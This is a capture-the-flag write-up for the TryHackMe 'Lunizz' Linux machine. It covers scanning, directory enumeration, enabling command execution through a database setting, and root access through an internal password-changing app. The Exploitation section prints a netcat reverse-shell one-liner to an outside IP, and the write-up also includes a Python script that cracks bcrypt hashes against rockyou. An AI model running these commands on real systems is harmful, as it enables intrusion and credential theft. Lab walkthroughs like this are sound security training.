# Lunizz CTF TryHackMe Writeup
### Level: `Medium` | OS: `Linux`

![logo](1.png)

## Scanning
We scan with nmap all ports with versions and scripts, we locate two strings in base64.

![](2.png)

#### Decode strings in base64

![](2-2.png)

## Enumeration
Web service on port 80 that shows the default Apache page.

![](3.png)

We scan with nmap and the script *"http-enum"*, we will enumerate a directory called *"/hidden/"*.

![](4.png)

We access the directory and find an application that allows us to host image files. (rabbit hole)

![](5.png)

We launch the **dirsearch** tool and list a new directory.

![](6.png)

We access, we see that we have a form where it seems that it is possible to execute commands... But no, it does not work.

![](7.png)

We run **dirsearch** again, this time we will try to enumerate files by extensions. We see that we list a file named *"instructions.txt"*.

![](8.png)

We access the file and find some credentials.

![](9.png)

We use the credentials to connect to the DB, remember that the application option to execute commands was set to *"0"*, we set it to *"1"* and save.

![](10.png)

We reload the page, check that Mode is now set to *"1"* and the **"ls"** command runs perfectly and prints the files.

![](11.png)

## Exploitation
We set up a listening netcat on our kali and run our payload for a reverse shell

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.30.149 443 >/tmp/f
```
#### Revers shell

![](12.png)

Doing reconnaissance, we find a file called *"bcrypt_encryption.py"*, in the Python code we see that it prints a hash with salted, also a commented hash in the script.

![](13.png)

Examining the *python* script, I split the hash into two pieces (hashed password + salt), cross-referenced it with the wordlist **rockyou** and checked if the hash matched to find out the clear password. 

#### Python script code
```python
import bcrypt
import base64

salt   = b'$2XXXXXXXXXXXXXXXXXXXX'
hashPass = b'$2XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'

with open("rockyou.txt","r") as f:
	for word in f.readlines():
		passw = word.strip().encode('ascii', 'ignore')
		b64str = base64.b64encode(passw)
		hashAndSalt = bcrypt.hashpw(b64str, salt)
		#print(hashAndSalt)
		#print(passw)

		if hashPass == hashAndSalt:
			print("[+] Password Found!!!: %s" % passw)
			break
```

#### Execute decrypt python script

![](14.png)

We authenticate as the user *"adam"* and see several interesting files that mention the user *"mason"*.

![](15.png)

We found a **hidden directory** with this message, apparently it is a hint to list the password for the user *"mason"*.

![](16.png)

We access the URL, there we see an image that will give us the clue without much difficulty. *(I will not show the image so as not to make spoilers)*

We use the password on the user *"mason"* and read the flag of *"user.txt"*.

![](17.png)


## Privilege Escalation

We use the script **linpeas.sh** and list that there is a web service up internally on *port 8080*.

![](18.png)

We use curl on the website, we see an application with three options, I used the *"passwd"* option and the password of the user *"mason"* which modified the password of the user *"root"*. After that, I just had to log in as root and read the flag.

![](19.png)


---
## About

David Utón is Penetration Tester and security auditor for web and mobiles applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks.

#### Contacted on:

<img src='https://m3n0sd0n4ld.github.io/imgs/linkedin.png' width='40' align='center'> [David-Uton](https://www.linkedin.com/in/david-uton/)
<img src='https://m3n0sd0n4ld.github.io/imgs/twitter.png' width='43' align='center'> [@David_Uton](https://twitter.com/David_Uton)
